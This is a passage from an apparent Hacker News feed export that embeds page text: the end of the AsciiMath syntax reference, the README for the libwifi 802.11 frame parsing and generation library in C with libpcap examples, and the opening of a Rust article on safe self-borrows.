        &lt;cell&gt;`AA`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;EE&lt;/cell&gt;
        &lt;cell&gt;exists&lt;/cell&gt;
        &lt;cell&gt;`EE`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;_|_&lt;/cell&gt;
        &lt;cell&gt;bot&lt;/cell&gt;
        &lt;cell&gt;`_|_`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;TT&lt;/cell&gt;
        &lt;cell&gt;top&lt;/cell&gt;
        &lt;cell&gt;`TT`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|--&lt;/cell&gt;
        &lt;cell&gt;vdash&lt;/cell&gt;
        &lt;cell&gt;`|--`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;|==&lt;/cell&gt;
        &lt;cell&gt;models&lt;/cell&gt;
        &lt;cell&gt;`|==`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;(&lt;/cell&gt;
        &lt;cell&gt;`(`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;)&lt;/cell&gt;
        &lt;cell&gt;`)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;[&lt;/cell&gt;
        &lt;cell&gt;`[`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;]&lt;/cell&gt;
        &lt;cell&gt;`]`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;{&lt;/cell&gt;
        &lt;cell&gt;`{`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;}&lt;/cell&gt;
        &lt;cell&gt;`}`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;(:&lt;/cell&gt;
        &lt;cell&gt;langle&lt;/cell&gt;
        &lt;cell&gt;`(:`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;:)&lt;/cell&gt;
        &lt;cell&gt;rangle&lt;/cell&gt;
        &lt;cell&gt;`:)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;lt;&amp;lt;&lt;/cell&gt;
        &lt;cell&gt;`&amp;lt;&amp;lt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;{: x )&lt;/cell&gt;
        &lt;cell&gt;`{: x )`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;( x :}&lt;/cell&gt;
        &lt;cell&gt;`( x :}`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;abs(x)&lt;/cell&gt;
        &lt;cell&gt;`abs(x)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;floor(x)&lt;/cell&gt;
        &lt;cell&gt;`floor(x)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ceil(x)&lt;/cell&gt;
        &lt;cell&gt;`ceil(x)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;norm(vecx)&lt;/cell&gt;
        &lt;cell&gt;`norm(vecx)`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;uarr&lt;/cell&gt;
        &lt;cell&gt;uparrow&lt;/cell&gt;
        &lt;cell&gt;`uarr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;darr&lt;/cell&gt;
        &lt;cell&gt;downarrow&lt;/cell&gt;
        &lt;cell&gt;`darr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;rarr&lt;/cell&gt;
        &lt;cell&gt;rightarrow&lt;/cell&gt;
        &lt;cell&gt;`rarr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;to&lt;/cell&gt;
        &lt;cell&gt;`-&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;-&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;rightarrowtail&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;-&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-&amp;gt;&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;twoheadrightarrow&lt;/cell&gt;
        &lt;cell&gt;`-&amp;gt;&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;-&amp;gt;&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;twoheadrightarrowtail&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;-&amp;gt;&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|-&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;mapsto&lt;/cell&gt;
        &lt;cell&gt;`|-&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;larr&lt;/cell&gt;
        &lt;cell&gt;leftarrow&lt;/cell&gt;
        &lt;cell&gt;`larr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;harr&lt;/cell&gt;
        &lt;cell&gt;leftrightarrow&lt;/cell&gt;
        &lt;cell&gt;`harr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;rArr&lt;/cell&gt;
        &lt;cell&gt;Rightarrow&lt;/cell&gt;
        &lt;cell&gt;`rArr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;lArr&lt;/cell&gt;
        &lt;cell&gt;Leftarrow&lt;/cell&gt;
        &lt;cell&gt;`lArr`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;hArr&lt;/cell&gt;
        &lt;cell&gt;Leftrightarrow&lt;/cell&gt;
        &lt;cell&gt;`hArr`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;hat x&lt;/cell&gt;
        &lt;cell&gt;`hat x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;bar x&lt;/cell&gt;
        &lt;cell&gt;overline x&lt;/cell&gt;
        &lt;cell&gt;`bar x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ul x&lt;/cell&gt;
        &lt;cell&gt;underline x&lt;/cell&gt;
        &lt;cell&gt;`ul x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;vec x&lt;/cell&gt;
        &lt;cell&gt;`vec x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;tilde x&lt;/cell&gt;
        &lt;cell&gt;`tilde x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;dot x&lt;/cell&gt;
        &lt;cell&gt;`dot x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ddot x&lt;/cell&gt;
        &lt;cell&gt;`ddot x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;overset(x)(=)&lt;/cell&gt;
        &lt;cell&gt;overset(x)(=)&lt;/cell&gt;
        &lt;cell&gt;`overset(x)(=)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;underset(x)(=)&lt;/cell&gt;
        &lt;cell&gt;`underset(x)(=)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ubrace(1+2)&lt;/cell&gt;
        &lt;cell&gt;underbrace(1+2)&lt;/cell&gt;
        &lt;cell&gt;`ubrace(1+2)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;obrace(1+2)&lt;/cell&gt;
        &lt;cell&gt;overbrace(1+2)&lt;/cell&gt;
        &lt;cell&gt;`obrace(1+2)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;overarc(AB)&lt;/cell&gt;
        &lt;cell&gt;overparen(AB)&lt;/cell&gt;
        &lt;cell&gt;`overarc(AB)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;color(red)(x)&lt;/cell&gt;
        &lt;cell&gt;`color(red)(x)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;cancel(x)&lt;/cell&gt;
        &lt;cell&gt;`cancel(x)`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;alpha&lt;/cell&gt;
        &lt;cell&gt;`alpha`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;beta&lt;/cell&gt;
        &lt;cell&gt;`beta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;gamma&lt;/cell&gt;
        &lt;cell&gt;`gamma`&lt;/cell&gt;
        &lt;cell&gt;Gamma&lt;/cell&gt;
        &lt;cell&gt;`Gamma`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;delta&lt;/cell&gt;
        &lt;cell&gt;`delta`&lt;/cell&gt;
        &lt;cell&gt;Delta&lt;/cell&gt;
        &lt;cell&gt;`Delta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;epsilon&lt;/cell&gt;
        &lt;cell&gt;`epsilon`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;varepsilon&lt;/cell&gt;
        &lt;cell&gt;`varepsilon`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;zeta&lt;/cell&gt;
        &lt;cell&gt;`zeta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;eta&lt;/cell&gt;
        &lt;cell&gt;`eta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;theta&lt;/cell&gt;
        &lt;cell&gt;`theta`&lt;/cell&gt;
        &lt;cell&gt;Theta&lt;/cell&gt;
        &lt;cell&gt;`Theta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;vartheta&lt;/cell&gt;
        &lt;cell&gt;`vartheta`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;iota&lt;/cell&gt;
        &lt;cell&gt;`iota`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;kappa&lt;/cell&gt;
        &lt;cell&gt;`kappa`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;lambda&lt;/cell&gt;
        &lt;cell&gt;`lambda`&lt;/cell&gt;
        &lt;cell&gt;Lambda&lt;/cell&gt;
        &lt;cell&gt;`Lambda`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;mu&lt;/cell&gt;
        &lt;cell&gt;`mu`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;nu&lt;/cell&gt;
        &lt;cell&gt;`nu`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;xi&lt;/cell&gt;
        &lt;cell&gt;`xi`&lt;/cell&gt;
        &lt;cell&gt;Xi&lt;/cell&gt;
        &lt;cell&gt;`Xi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;pi&lt;/cell&gt;
        &lt;cell&gt;`pi`&lt;/cell&gt;
        &lt;cell&gt;Pi&lt;/cell&gt;
        &lt;cell&gt;`Pi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;rho&lt;/cell&gt;
        &lt;cell&gt;`rho`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;sigma&lt;/cell&gt;
        &lt;cell&gt;`sigma`&lt;/cell&gt;
        &lt;cell&gt;Sigma&lt;/cell&gt;
        &lt;cell&gt;`Sigma`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;tau&lt;/cell&gt;
        &lt;cell&gt;`tau`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;upsilon&lt;/cell&gt;
        &lt;cell&gt;`upsilon`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;phi&lt;/cell&gt;
        &lt;cell&gt;`phi`&lt;/cell&gt;
        &lt;cell&gt;Phi&lt;/cell&gt;
        &lt;cell&gt;`Phi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;varphi&lt;/cell&gt;
        &lt;cell&gt;`varphi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;chi&lt;/cell&gt;
        &lt;cell&gt;`chi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;psi&lt;/cell&gt;
        &lt;cell&gt;`psi`&lt;/cell&gt;
        &lt;cell&gt;Psi&lt;/cell&gt;
        &lt;cell&gt;`Psi`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;omega&lt;/cell&gt;
        &lt;cell&gt;`omega`&lt;/cell&gt;
        &lt;cell&gt;Omega&lt;/cell&gt;
        &lt;cell&gt;`Omega`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;bb "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathbf "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`bb "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;bbb "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathbb "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`bbb "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;cc "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathcal "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`cc "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;tt "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathtt "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`tt "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;fr "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathfrak "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`fr "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;sf "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;mathsf "AaBbCc"&lt;/cell&gt;
        &lt;cell&gt;`sf "AaBbCc"`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Standard Functions&lt;/head&gt;
    &lt;p&gt;sin, cos, tan, sec, csc, cot, arcsin, arccos, arctan, sinh, cosh, tanh, sech, csch, coth, exp, log, ln, det, dim, mod, gcd, lcm, lub, glb, min, max, f, g.&lt;/p&gt;
    &lt;head rend="h3"&gt;Special Cases&lt;/head&gt;
    &lt;p&gt;Matrices: &lt;code&gt;[[a,b],[c,d]]&lt;/code&gt; yields to `[[a,b],[c,d]]`&lt;/p&gt;
    &lt;p&gt;Column vectors: &lt;code&gt;((a),(b))&lt;/code&gt; yields to `((a),(b))`&lt;/p&gt;
    &lt;p&gt;Augmented matrices: &lt;code&gt;[[a,b,|,c],[d,e,|,f]]&lt;/code&gt; yields to `[[a,b,|,c],[d,e,|,f]]`&lt;/p&gt;
    &lt;p&gt;Matrices can be used for layout: &lt;code&gt;{(2x,+,17y,=,23),(x,-,y,=,5):}&lt;/code&gt; yields
 `{(2x,+,17y,=,23),(x,-,y,=,5):}`&lt;/p&gt;
    &lt;p&gt;Complex subscripts: &lt;code&gt;lim_(N-&amp;gt;oo) sum_(i=0)^N&lt;/code&gt; yields to `lim_(N-&amp;gt;oo) sum_(i=0)^N`&lt;/p&gt;
    &lt;p&gt;Subscripts must come before superscripts: &lt;code&gt;int_0^1 f(x)dx&lt;/code&gt; yields to `int_0^1 f(x)dx`&lt;/p&gt;
    &lt;p&gt;Derivatives: &lt;code&gt; f'(x) = dy/dx&lt;/code&gt; yields `f'(x) = dy/dx`&lt;lb/&gt; For variables other than x,y,z, or t you will need grouping symbols: &lt;code&gt; (dq)/(dp)&lt;/code&gt; for `(dq)/(dp)`&lt;/p&gt;
    &lt;p&gt;Overbraces and underbraces: &lt;code&gt;ubrace(1+2+3+4)_("4 terms")&lt;/code&gt; yields `ubrace(1+2+3+4)_("4 terms")`.&lt;code&gt;obrace(1+2+3+4)^("4 terms")&lt;/code&gt; yields `obrace(1+2+3+4)^("4 terms")`.
&lt;/p&gt;
    &lt;p&gt;Attention: Always try to surround the &lt;code&gt;&amp;gt;&lt;/code&gt; and
	&lt;code&gt;&amp;lt;&lt;/code&gt; characters with spaces so that the html parser does not
	confuse it with an opening or closing tag!&lt;/p&gt;
    &lt;head rend="h3"&gt;The Grammar&lt;/head&gt;
    &lt;p&gt;Here is a definition of the grammar used to parse AsciiMath expressions. In the Backus-Naur form given below, the letter on the left of the &lt;code&gt;::=&lt;/code&gt; represents a category of symbols that could be one
	of the possible sequences of symbols listed on the right.
	The vertical bar &lt;code&gt;|&lt;/code&gt; separates the alternatives.&lt;/p&gt;
    &lt;quote&gt;v ::= [A-Za-z] | greek letters | numbers | other constant symbols u ::= sqrt | text | bb | other unary symbols for font commands b ::= frac | root | stackrel | other binary symbols l ::= ( | [ | { | (: | {: | other left brackets r ::= ) | ] | } | :) | :} | other right brackets S ::= v | lEr | uS | bSS Simple expression I ::= S_S | S^S | S_S^S | S Intermediate expression E ::= IE | I/I Expression&lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://asciimath.org/"/><published>2025-11-15T21:22:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45941025</id><title>libwifi: an 802.11 frame parsing and generation library written in C (2023)</title><updated>2025-11-16T15:08:50.376458+00:00</updated><content>&lt;doc fingerprint="7a1d0719764d821a"&gt;
  &lt;main&gt;&lt;p&gt; libwifi is a fast, simple C shared library with a permissive license for generating and parsing a wide variety of 802.11 wireless frames on Linux and macOS with a few lines of straight forward code. &lt;lb/&gt; It is written with a simple-to-use approach while also exposing features that allow more advanced use, with clean and readable code being a priority. &lt;lb/&gt; Other goals of the library include cross-architecture support, clean compilation without warnings and strict error checking. &lt;/p&gt;&lt;head rend="h1"&gt;What is libwifi?&lt;/head&gt;&lt;head rend="h1"&gt;How do I use it?&lt;/head&gt;&lt;p&gt; libwifi exposes functions and structs to make parsing and generating WiFi frames very easy, and examples can be found in the source examples directory. &lt;lb/&gt;When using libwifi, be sure to pass&lt;lb/&gt; The data from the libpcap loop is then given to &lt;lb/&gt; The &lt;lb/&gt;We'll use the BSS struct to easily show the SSID and Channel from the sniffed beacon frame.&lt;lb/&gt; From here, we can use the dumper function for this frame subtype to write the beacon in raw byte format to a buffer. This can be useful for writing the generated frame out to a pcap file using &lt;/p&gt;&lt;p&gt;When using libwifi, be sure to pass&lt;/p&gt;&lt;code&gt;-lwifi&lt;/code&gt; to the linker, and make sure that the libwifi shared library is installed on the system.
    &lt;head rend="h2"&gt;Parsing&lt;/head&gt;The generic flow of a program using libwifi to parse frames is a loop that reads captured packets as raw data, such as with libpcap from a file or monitor interface, then parse the frame into a common datatype, then parse again to retrieve frame specific data.&lt;code&gt;&lt;quote&gt;
static int got_radiotap = 0;

int main(int argc, const char *argv[]) {
    pcap_t handle = {0};
    char errbuf[PCAP_ERRBUF_SIZE] = {0};

    if ((handle = pcap_create(argv[2], errbuf)) == NULL) {
        exit(EXIT_FAILURE);
    }

    if (pcap_activate(handle) != 0) {
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    int linktype = pcap_datalink(handle);
    if (linktype == DLT_IEEE802_11_RADIO) {
        got_radiotap = 1;
    } else if (linktype == DLT_IEEE802_11) {
        got_radiotap = 0;
    } else {
        pcap_close(handle);
        exit(EXIT_FAILURE);
    }

    pd = pcap_dump_open(handle, PCAP_SAVEFILE);
    pcap_loop(handle, -1 /*INFINITY*/, &amp;amp;parse_packet, (unsigned char *) pd);
}
    &lt;/quote&gt;&lt;/code&gt;&lt;code&gt;libwifi_get_frame()&lt;/code&gt; which checks for frame validity and type/subtype, and stores the data in a &lt;code&gt;struct libwifi_frame&lt;/code&gt;.
    &lt;code&gt;&lt;quote&gt;
void parse_packet(unsigned char *args,
                  const struct pcap_pkthdr *header,
                  const unsigned char *packet) {
    unsigned long data_len = header-&amp;gt;caplen;
    unsigned char *data = (unsigned char *) packet;

    struct libwifi_frame frame = {0};
    int ret = libwifi_get_wifi_frame(&amp;amp;frame, data, data_len, got_radiotap);
    if (ret != 0) {
        printf("[!] Error getting libwifi_frame: %d\n", ret);
        return;
    }
    &lt;/quote&gt;&lt;/code&gt;&lt;code&gt;libwifi_frame&lt;/code&gt; struct can then be given to one of the frame parser functions, such as &lt;code&gt;libwifi_parse_beacon()&lt;/code&gt;. Since the header comment for
    &lt;code&gt;libwifi_parse_beacon()&lt;/code&gt; indicates that the parsed data is stored in a &lt;code&gt;struct libwifi_bss&lt;/code&gt;, we need to initalise one and pass it as a parameter.
    &lt;p&gt;We'll use the BSS struct to easily show the SSID and Channel from the sniffed beacon frame.&lt;/p&gt;&lt;code&gt;&lt;quote&gt;
    if (frame.frame_control.type == TYPE_MANAGEMENT &amp;amp;&amp;amp;
        frame.frame_control.subtype == SUBTYPE_BEACON) {
        struct libwifi_bss bss = {0};

        int ret = libwifi_parse_beacon(&amp;amp;bss, &amp;amp;frame);
        if (ret != 0) {
            printf("Failed to parse beacon: %d\n", ret);
            return;
        }

        printf("SSID: %s, Channel: %d\n", bss.ssid, bss.channel);
    }
}
    &lt;/quote&gt;&lt;/code&gt;&lt;head rend="h2"&gt;Generation&lt;/head&gt;For frame generation, you only need to provide the required data to one of the frame generation functions. In this example,&lt;code&gt;libwifi_create_beacon()&lt;/code&gt;.
    &lt;code&gt;&lt;quote&gt;
int main(int argc, char **argv) {
    struct libwifi_beacon beacon = {0};
    static unsigned char bcast[] = "\xFF\xFF\xFF\xFF\xFF\xFF";
    static unsigned char tx[] = "\x00\x20\x91\xAA\xBB\CC";

    int ret = libwifi_create_beacon(&amp;amp;beacon, bcast, tx, tx, "wifi-beacon", 11);
    if (ret != 0) {
        return ret;
    }
    &lt;/quote&gt;&lt;/code&gt;&lt;code&gt;pcap_dump()&lt;/code&gt; or transmitting from a monitor mode interface.
    &lt;code&gt;&lt;quote&gt;
    unsigned char *buf = NULL;
    size_t buf_sz = libwifi_get_beacon_length(&amp;amp;beacon);

    buf = malloc(buf_sz);
    if (buf == NULL) {
        exit(EXIT_FAILURE);
    }

    ret = libwifi_dump_beacon(&amp;amp;beacon, buf, buf_sz);
    if (ret &amp;lt; 0) {
        return ret;
    }

    // Inject frame bytes or write bytes to file

    libwifi_free_beacon(&amp;amp;beacon);
    free(buf);
}
    &lt;/quote&gt;&lt;/code&gt;&lt;head rend="h1"&gt;How do I build it?&lt;/head&gt;&lt;p&gt; The build system is implemented with CMake. To build it, clone the repository and run the following commands. &lt;/p&gt;&lt;code&gt;&lt;quote&gt;
$ mkdir build &amp;amp;&amp;amp; cd build
$ cmake .. -DCMAKE_BUILD_TYPE=Release
$ make -j8
$ sudo make install
    &lt;/quote&gt;&lt;/code&gt;&lt;head rend="h1"&gt;How fast is it?&lt;/head&gt;&lt;p&gt; There is a simple benchmark for measuring basic Beacon parsing performance in the benchmark directory. Here are the results when ran on an i7-1185G7 at 3.00GHz. &lt;/p&gt;&lt;code&gt;&lt;quote&gt;
$ ./benchmark_beacon
Run 1:  0.0000190 Seconds
Run 2:  0.0000030 Seconds
Run 3:  0.0000020 Seconds
Run 4:  0.0000010 Seconds
Run 5:  0.0000010 Seconds
Run 6:  0.0000010 Seconds
Run 7:  0.0000020 Seconds
Run 8:  0.0000020 Seconds
Run 9:  0.0000020 Seconds
Run 10: 0.0000010 Seconds
Run 11: 0.0000010 Seconds
Run 12: 0.0000010 Seconds
    &lt;/quote&gt;&lt;/code&gt;&lt;head rend="h1"&gt;Where are the docs?&lt;/head&gt;&lt;p&gt; The source code for libwifi is fully documented with code comments, including diagrams for structs and frame layouts where necessary. You can also view the generated docs here. &lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://libwifi.so/"/><published>2025-11-15T22:16:33+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45941441</id><title>Blocking LLM crawlers without JavaScript</title><updated>2025-11-16T15:08:49.417161+00:00</updated><link href="https://www.owl.is/blogg/blocking-crawlers-without-javascript/"/><published>2025-11-15T23:30:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45941443</id><title>The inconceivable types of Rust: How to make self-borrows safe (2024)</title><updated>2025-11-16T15:08:49.130952+00:00</updated><content>&lt;doc fingerprint="ae08d8132d351b61"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Inconceivable Types of Rust: How to Make Self-Borrows Safe&lt;/head&gt;
    &lt;p&gt;One of the first things any Rust programmer learns is that you can’t pass an object and a reference to that object around at the same time. It’s impossible to do, even indirectly. This limitation has been the subject of countless questions on Stack Overflow and posts on Reddit and the Rust forums and anywhere else where Rust programmers might ask for help. It’s so well-known that most people treat it like an axiom, not just a limitation of Rust as it currently exists, but an inherent limitation of borrow checking in general.&lt;/p&gt;
    &lt;p&gt;However, that’s not the case. In fact, with the right perspective, the way to support it is obvious. In this post, I’ll walk through the steps and show how self-borrows and much more could be supported in a hypothetical alternate or future version of Rust.&lt;/p&gt;
    &lt;head rend="h3"&gt;But first, some obligatory disclaimers&lt;/head&gt;
    &lt;p&gt;To be clear, when I say something can’t be done in Rust, what I mean is that it can’t be done in a safe, zero-cost way. As an army of internet commenters are no doubt rushing to observe, any limitation of a static type system can be bypassed by using unsafety or runtime checks instead (e.g. “lol, just wrap everything in &lt;code&gt;Arc&amp;lt;Mutex&amp;lt;T&amp;gt;&amp;gt;&lt;/code&gt;” or “lol, just build your own memory management on top of &lt;code&gt;Vec&lt;/code&gt; indices”). And the fact that a less safe or efficient workaround exists is of great interest to people who just need to solve a problem quickly. But from a language design perspective, the pertinent fact is that Rust’s type system has gaps which make certain common tasks impossible to do in a way that lets Rust be Rust, and not just a glorified C or Javascript.&lt;/p&gt;
